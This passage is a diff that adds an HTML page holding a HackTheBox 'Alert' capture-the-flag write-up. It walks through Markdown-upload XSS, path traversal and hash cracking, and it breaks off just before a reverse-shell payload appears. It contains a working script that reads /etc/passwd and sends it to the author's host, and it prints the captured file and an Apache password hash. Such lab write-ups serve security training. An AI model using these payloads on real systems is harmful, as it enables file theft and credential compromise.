@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alert - Hexicon Archives</title>
+    <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
+    <link rel="stylesheet" href="../style.css">
+    <!-- Machine-specific metadata for SEO -->
+    <meta name="description" content="Detailed writeup for Alert machine from HackTheBox - Easy difficulty level">
+    <meta name="keywords" content="HackTheBox, Alert, Easy, CTF, writeup, cybersecurity, penetration testing, Hexicon">
+</head>
+<body>
+    <header>
+        <div class="container header-content">
+            <a href="../index.html" class="logo">All writeups</a>
+            <div class="header-controls">
+                <a href="#" class="htb-icon" title="Link to the main page(Coming soon!)">
+                    <img src="../favicon.png" alt="Archive" width="30" height="30">
+                </a>
+                <div class="hamburger-menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <div class="sidebar">
+        <div class="difficulty-buttons">
+            <button class="difficulty-btn" data-difficulty="easy">Easy</button>
+            <div class="machine-list" id="easy-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="medium">Medium</button>
+            <div class="machine-list" id="medium-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="hard">Hard</button>
+            <div class="machine-list" id="hard-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+
+            <button class="difficulty-btn" data-difficulty="insane">Insane</button>
+            <div class="machine-list" id="insane-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+        </div>
+    </div>
+    
+    <div class="backdrop"></div>
+    
+    <main class="container writeup-content">
+        <h1 class="writeup-title">Alert</h1>
+        <div class="writeup-metadata">
+            <span class="difficulty easy">Easy</span>
+            <span class="date">March 22, 2025</span>
+        </div>
+        
+        <div class="writeup-container">
+            <div class="writeup-body">
+                <!-- Machine-specific content goes here -->
+                <p><img alt="Alert" src="../images/Alert/pwned.png" /></p>
+<p>Alert was an engaging box that required exploiting a Markdown file upload vulnerability and leveraging XSS to achieve Local File Inclusion (LFI). By tricking an administrator into executing a malicious payload, I retrieved hashed credentials from an internal subdomain and cracked them to gain SSH access as Albert. Privilege escalation was achieved by modifying a writable configuration file within a locally running web monitoring service, injecting a reverse shell to gain root. This box emphasized the risks of improper input validation, exposed internal services and misconfigured file permissions.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Alert/nmap.png" /></p>
+<p>Nmap scan reveals only two ports. I'll check the revealed website.</p>
+<p><img alt="markdownviewer" src="../images/Alert/markdownviewer.png" /></p>
+<p>This website provides a file upload functionality. Looking at the source code, I can see that only .md files are accedpted and that there is a .php script taking the uploaded files. There is also a contact form.</p>
+<div class="codehilite"><pre><span></span><code># Source
+
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&quot;en&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;UTF-8&quot;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;viewport&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;width=device-width, initial-scale=1.0&quot;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;css/style.css&quot;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Alert - Markdown Viewer<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">nav</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;index.php?page=alert&quot;</span><span class="p">&gt;</span>Markdown Viewer<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;index.php?page=contact&quot;</span><span class="p">&gt;</span>Contact Us<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;index.php?page=about&quot;</span><span class="p">&gt;</span>About Us<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;index.php?page=donate&quot;</span><span class="p">&gt;</span>Donate<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+            <span class="p">&lt;/</span><span class="nt">nav</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;container&quot;</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Markdown Viewer<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-container&quot;</span><span class="p">&gt;</span>
+            <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;visualizer.php&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;multipart/form-data&quot;</span><span class="p">&gt;</span>
+                <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;file&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;file&quot;</span> <span class="na">accept</span><span class="o">=</span><span class="s">&quot;.md&quot;</span> <span class="na">required</span><span class="p">&gt;</span>
+                <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;View Markdown&quot;</span><span class="p">&gt;</span>
+            <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+          <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">footer</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">p</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;color: black;&quot;</span><span class="p">&gt;</span>© 2024 Alert. All rights reserved.<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">footer</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+
+<p>Any attempt to upload a file that is not a .md file would end up with a 'Error: File must be a Markdown file (.md). ' error.</p>
+<h2>Fuzzing</h2>
+<p>Having no leads to check, I began fuzzing for subdomains and searching for directories.</p>
+<p><img alt="fuzzing" src="../images/Alert/fuzzing.png" /></p>
+<p><img alt="ffuf" src="../images/Alert/ffuf.png" /></p>
+<p>Found a statistics subdomain.</p>
+<p><img alt="nonew" src="../images/Alert/nonew.png" /></p>
+<p><img alt="gobuster" src="../images/Alert/gobuster.png" /></p>
+<p>And a bunch of files. The subdomain requires credentials to access, so I wont be able to just check the files.</p>
+<h2>LFI via XSS</h2>
+<p>I tested whether inputting links into the message form would bring any results, and it did!</p>
+<p><img alt="hit" src="../images/Alert/hit.png" /></p>
+<p>Someone clicked the link as soon as I sent it. It may be possible to snatch something from the person on the other side, or maybe a file?</p>
+<div class="codehilite"><pre><span></span><code><span class="nt">&lt;script&gt;</span>
+fetch(&quot;http://alert.htb/messages.php?file=../../../../etc/passwd&quot;)
+<span class="w">  </span>.then(response<span class="w"> </span>=&gt;<span class="w"> </span>response.text())
+<span class="w">  </span>.then(data<span class="w"> </span>=&gt;<span class="w"> </span>{
+<span class="w">    </span>fetch(&quot;http://10.10.16.2:80/?file_content=&quot;<span class="w"> </span>+<span class="w"> </span>encodeURIComponent(data));
+<span class="w">  </span>});
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div>
+
+<p>This script should send me back the contents of /etc/passwd, as the file parameter most likely isn't sanitized at all.</p>
+<p>After uploading the .md file, I noticed a share link in the bottom left of the screen.</p>
+<p><img alt="share" src="../images/Alert/share.png" /></p>
+<p>I'll copy the link and send it over to the contact form.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">python</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="n">http</span><span class="o">.</span><span class="n">server</span>
+<span class="n">Serving</span><span class="w"> </span><span class="n">HTTP</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="mi">8000</span><span class="w"> </span><span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">8000</span><span class="o">/</span><span class="p">)</span><span class="w"> </span><span class="o">...</span>
+<span class="mf">10.10</span><span class="o">.</span><span class="mf">16.25</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">[</span><span class="mi">24</span><span class="o">/</span><span class="n">Mar</span><span class="o">/</span><span class="mi">2025</span><span class="w"> </span><span class="mi">13</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">47</span><span class="p">]</span><span class="w"> </span><span class="s2">&quot;GET /?file_content=%0A HTTP/1.1&quot;</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span><span class="o">-</span>
+<span class="mf">10.10</span><span class="o">.</span><span class="mf">11.44</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">[</span><span class="mi">24</span><span class="o">/</span><span class="n">Mar</span><span class="o">/</span><span class="mi">2025</span><span class="w"> </span><span class="mi">13</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">57</span><span class="p">]</span><span class="w"> </span><span class="s2">&quot;GET /?file_content=%3Cpre</span><span class="si">%3E</span><span class="s2">root%3Ax%3A0%3A0%3Aroot%3A</span><span class="si">%2F</span><span class="s2">root%3A</span><span class="si">%2F</span><span class="s2">bin</span><span class="si">%2F</span><span class="s2">bash%0Adaemon%3Ax%3A1%3A1%3Adaemon%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Abin%3Ax%3A2%3A2%3Abin%3A</span><span class="si">%2F</span><span class="s2">bin%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Asys%3Ax%3A3%3A3%3Asys%3A</span><span class="si">%2F</span><span class="s2">dev%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Async%3Ax%3A4%3A65534%3Async%3A</span><span class="si">%2F</span><span class="s2">bin%3A</span><span class="si">%2F</span><span class="s2">bin</span><span class="si">%2F</span><span class="s2">sync%0Agames%3Ax%3A5%3A60%3Agames%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">games%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Aman%3Ax%3A6%3A12%3Aman%3A</span><span class="si">%2F</span><span class="s2">var</span><span class="si">%2F</span><span class="s2">cache</span><span class="si">%2F</span><span class="s2">man%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Alp%3Ax%3A7%3A7%3Alp%3A</span><span class="si">%2F</span><span class="s2">var</span><span class="si">%2F</span><span class="s2">spool</span><span class="si">%2F</span><span class="s2">lpd%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Amail%3Ax%3A8%3A8%3Amail%3A</span><span class="si">%2F</span><span class="s2">var</span><span class="si">%2F</span><span class="s2">mail%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Anews%3Ax%3A9%3A9%3Anews%3A</span><span class="si">%2F</span><span class="s2">var</span><span class="si">%2F</span><span class="s2">spool</span><span class="si">%2F</span><span class="s2">news%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Auucp%3Ax%3A10%3A10%3Auucp%3A</span><span class="si">%2F</span><span class="s2">var</span><span class="si">%2F</span><span class="s2">spool</span><span class="si">%2F</span><span class="s2">uucp%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Aproxy%3Ax%3A13%3A13%3Aproxy%3A</span><span class="si">%2F</span><span class="s2">bin%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Awww-data%3Ax%3A33%3A33%3Awww-data%3A</span><span class="si">%2F</span><span class="s2">var</span><span class="si">%2F</span><span class="s2">www%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Abackup%3Ax%3A34%3A34%3Abackup%3A</span><span class="si">%2F</span><span class="s2">var</span><span class="si">%2F</span><span class="s2">backups%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Alist%3Ax%3A38%3A38%3AMailing</span><span class="si">%20Li</span><span class="s2">st%20Manager%3A</span><span class="si">%2F</span><span class="s2">var</span><span class="si">%2F</span><span class="s2">list%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Airc%3Ax%3A39%3A39%3Aircd%3A</span><span class="si">%2F</span><span class="s2">var</span><span class="si">%2F</span><span class="s2">run</span><span class="si">%2F</span><span class="s2">ircd%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Agnats%3Ax%3A41%3A41%3AGnats%20Bug-Reporting%20System%20(admin)%3A</span><span class="si">%2F</span><span class="s2">var</span><span class="si">%2F</span><span class="s2">lib</span><span class="si">%2F</span><span class="s2">gnats%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Anobody%3Ax%3A65534%3A65534%3Anobody%3A</span><span class="si">%2F</span><span class="s2">nonexistent%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Asystemd-network%3Ax%3A100%3A102%3Asystemd%20Network%20Management%2C%2C%2C%3A</span><span class="si">%2F</span><span class="s2">run</span><span class="si">%2F</span><span class="s2">systemd%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Asystemd-resolve%3Ax%3A101%3A103%3Asystemd%20Resolver%2C%2C%2C%3A</span><span class="si">%2F</span><span class="s2">run</span><span class="si">%2F</span><span class="s2">systemd%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Asystemd-timesync%3Ax%3A102%3A104%3Asystemd%20Time%20Synchronization%2C%2C%2C%3A</span><span class="si">%2F</span><span class="s2">run</span><span class="si">%2F</span><span class="s2">systemd%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Amessagebus%3Ax%3A103%3A106%3A%3A</span><span class="si">%2F</span><span class="s2">nonexistent%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Asyslog%3Ax%3A104%3A110%3A%3A</span><span class="si">%2F</span><span class="s2">home</span><span class="si">%2F</span><span class="s2">syslog%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0A_apt%3Ax%3A105%3A65534%3A%3A</span><span class="si">%2F</span><span class="s2">nonexistent%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Atss%3Ax%3A106%3A111%3ATPM</span><span class="si">%20s</span><span class="s2">oftware</span><span class="si">%20s</span><span class="s2">tack%2C%2C%2C%3A</span><span class="si">%2F</span><span class="s2">var</span><span class="si">%2F</span><span class="s2">lib</span><span class="si">%2F</span><span class="s2">tpm%3A</span><span class="si">%2F</span><span class="s2">bin</span><span class="si">%2F</span><span class="s2">false%0Auuidd%3Ax%3A107%3A112%3A%3A</span><span class="si">%2F</span><span class="s2">run</span><span class="si">%2F</span><span class="s2">uuidd%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Atcpdump%3Ax%3A108%3A113%3A%3A</span><span class="si">%2F</span><span class="s2">nonexistent%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Alandscape%3Ax%3A109%3A115%3A%3A</span><span class="si">%2F</span><span class="s2">var</span><span class="si">%2F</span><span class="s2">lib</span><span class="si">%2F</span><span class="s2">landscape%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Apollinate%3Ax%3A110%3A1%3A%3A</span><span class="si">%2F</span><span class="s2">var</span><span class="si">%2F</span><span class="s2">cache</span><span class="si">%2F</span><span class="s2">pollinate%3A</span><span class="si">%2F</span><span class="s2">bin</span><span class="si">%2F</span><span class="s2">false%0Afwupd-refresh%3Ax%3A111%3A116%3Afwupd-refresh</span><span class="si">%20u</span><span class="s2">ser%2C%2C%2C%3A</span><span class="si">%2F</span><span class="s2">run</span><span class="si">%2F</span><span class="s2">systemd%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Ausbmux%3Ax%3A112%3A46%3Ausbmux</span><span class="si">%20d</span><span class="s2">aemon%2C%2C%2C%3A</span><span class="si">%2F</span><span class="s2">var</span><span class="si">%2F</span><span class="s2">lib</span><span class="si">%2F</span><span class="s2">usbmux%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Asshd%3Ax%3A113%3A65534%3A%3A</span><span class="si">%2F</span><span class="s2">run</span><span class="si">%2F</span><span class="s2">sshd%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Asystemd-coredump%3Ax%3A999%3A999%3Asystemd%20Core%20Dumper%3A</span><span class="si">%2F</span><span class="s2">%3A</span><span class="si">%2F</span><span class="s2">usr</span><span class="si">%2F</span><span class="s2">sbin</span><span class="si">%2F</span><span class="s2">nologin%0Aalbert%3Ax%3A1000%3A1000%3Aalbert%3A</span><span class="si">%2F</span><span class="s2">home</span><span class="si">%2F</span><span class="s2">albert%3A</span><span class="si">%2F</span><span class="s2">bin</span><span class="si">%2F</span><span class="s2">bash%0Alxd%3Ax%3A998%3A100%3A%3A</span><span class="si">%2F</span><span class="s2">var</span><span class="si">%2F</span><span class="s2">snap</span><span class="si">%2F</span><span class="s2">lxd</span><span class="si">%2F</span><span class="s2">common</span><span class="si">%2F</span><span class="s2">lxd%3A</span><span class="si">%2F</span><span class="s2">bin</span><span class="si">%2F</span><span class="s2">false%0Adavid%3Ax%3A1001%3A1002%3A%2C%2C%2C%3A</span><span class="si">%2F</span><span class="s2">home</span><span class="si">%2F</span><span class="s2">david%3A</span><span class="si">%2F</span><span class="s2">bin</span><span class="si">%2F</span><span class="s2">bash%0A%3C</span><span class="si">%2F</span><span class="s2">pre</span><span class="si">%3E</span><span class="s2">%0A HTTP/1.1&quot;</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span><span class="o">-</span>
+</code></pre></div>
+
+<p><img alt="passwd" src="../images/Alert/passwd.png" /></p>
+<p>It worked! Now I'll try to grab the .htpasswd file. Since Apache is running underneath, there is a chance that this file might be used for storing credentials</p>
+<p><img alt="data" src="../images/Alert/data.png" /></p>
+<p>I'll decode the data using cyberchef.</p>
+<div class="codehilite"><pre><span></span><code>%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A<span class="w"> </span>&gt;<span class="w"> </span><span class="nt">&lt;pre&gt;</span>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/<span class="nt">&lt;/pre&gt;</span>
+</code></pre></div>
+
+<p>Its a hash! I'll send it over to hashcat for some quick cracking.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">hashcat</span><span class="w"> </span><span class="o">-</span><span class="n">a</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="nb">hash</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="o">--</span><span class="n">username</span>
+</code></pre></div>
+
+<p>I have the credentials for Albert! I'll try to SSH into the box now.</p>
+<p><img alt="user" src="../images/Alert/user.png" /></p>
+<h1>Root flag</h1>
+<p><img alt="ss" src="../images/Alert/ss.png" /></p>
+<p>During my recon, I noticed a service running locally at port 8080. I'll forward the port and check it out.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">ssh</span><span class="w"> </span><span class="o">-</span><span class="n">L</span><span class="w"> </span><span class="mi">8080</span><span class="o">:</span><span class="mf">127.0.0.1</span><span class="o">:</span><span class="mi">8080</span><span class="w"> </span><span class="n">albert</span><span class="mf">@10.10.11.44</span>
+</code></pre></div>
+
+<p><img alt="webmon" src="../images/Alert/webmon.png" /></p>
+<p>Its a website monitor page. Not much to see here, but I'll keep it in mind.</p>
+<p>Inside the web monitor's directory on the box, I found something interesting.</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="cm">/*</span>
+
+<span class="cm">Website Monitor</span>
+<span class="cm">===============</span>
+
+<span class="cm">Hello! This is the monitor script, which does the actual monitoring of websites</span>
+<span class="cm">stored in monitors.json.</span>
+
+<span class="cm">You can run this manually, but it’s probably better if you use a cron job.</span>
+<span class="cm">Here’s an example of a crontab entry that will run it every minute:</span>
+
+<span class="cm">* * * * * /usr/bin/php -f /path/to/monitor.php &gt;/dev/null 2&gt;&amp;1</span>
+
+<span class="cm">*/</span>
+
+<span class="k">include</span><span class="p">(</span><span class="s1">&#39;config/configuration.php&#39;</span><span class="p">);</span>
+
+<span class="nv">$monitors</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nx">PATH</span><span class="o">.</span><span class="s1">&#39;/monitors.json&#39;</span><span class="p">));</span>
+
+<span class="k">foreach</span><span class="p">(</span><span class="nv">$monitors</span> <span class="k">as</span> <span class="nv">$name</span> <span class="o">=&gt;</span> <span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$response_data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+        <span class="nv">$timestamp</span> <span class="o">=</span> <span class="nb">time</span><span class="p">();</span>
+        <span class="nv">$response_data</span><span class="p">[</span><span class="nv">$timestamp</span><span class="p">][</span><span class="s1">&#39;timestamp&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$timestamp</span><span class="p">;</span>
+        <span class="nv">$curl</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+        <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
+        <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+        <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+        <span class="nv">$response</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$response_data</span><span class="p">[</span><span class="nv">$timestamp</span><span class="p">][</span><span class="s1">&#39;error&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">curl_error</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span>
+                <span class="nv">$info</span> <span class="o">=</span> <span class="nb">curl_getinfo</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
+                <span class="nv">$http_code</span> <span class="o">=</span> <span class="nv">$info</span><span class="p">[</span><span class="s1">&#39;http_code&#39;</span><span class="p">];</span>
+                <span class="nv">$ms</span> <span class="o">=</span> <span class="nv">$info</span><span class="p">[</span><span class="s1">&#39;total_time_us&#39;</span><span class="p">]</span> <span class="o">/</span> <span class="mi">1000</span><span class="p">;</span>
+                <span class="nv">$response_data</span><span class="p">[</span><span class="nv">$timestamp</span><span class="p">][</span><span class="s1">&#39;time&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$ms</span><span class="p">;</span>
+                <span class="nv">$response_data</span><span class="p">[</span><span class="nv">$timestamp</span><span class="p">][</span><span class="s1">&#39;response&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$http_code</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="nb">curl_close</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nx">PATH</span><span class="o">.</span><span class="s1">&#39;/monitors/&#39;</span><span class="o">.</span><span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nv">$data</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nx">PATH</span><span class="o">.</span><span class="s1">&#39;/monitors/&#39;</span><span class="o">.</span><span class="nv">$name</span><span class="p">),</span> <span class="k">TRUE</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span>
+                <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$response_data</span><span class="p">);</span>
+        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">array_slice</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="o">-</span><span class="mi">60</span><span class="p">);</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="nx">PATH</span><span class="o">.</span><span class="s1">&#39;/monitors/&#39;</span><span class="o">.</span><span class="nv">$name</span><span class="p">,</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nx">JSON_PRETTY_PRINT</span><span class="p">));</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p><img alt="info" src="../images/Alert/info.png" /></p>
+<p>Using ps aux, I can confirm that this script is running.</p>
+<div class="codehilite"><pre><span></span><code>root        1010  0.0  0.6 206768 24276 ?        Ss   13:04   0:00 /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor
+</code></pre></div>
+
+<p>Since Albert is a member of the management group, he can write into the config file. I'll poison the file with a reverse shell script, which should grant me a root reverse shell!</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
